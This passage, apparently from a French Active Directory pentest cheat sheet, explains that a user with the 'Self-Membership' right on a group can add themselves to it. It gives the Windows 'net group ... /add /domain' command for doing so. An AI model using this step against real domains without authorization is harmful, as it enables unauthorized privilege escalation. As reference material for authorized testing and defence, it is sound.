Si notre utilisateur a le droit `Self-Membership` sur un groupe, alors il est habilité à se rajouter lui-même en tant que membre de ce groupe.

### 🍔 Depuis Windows

Ajouter notre utilisateur au groupe cible :

```
net group "groupe cible" $user /add /domain
```
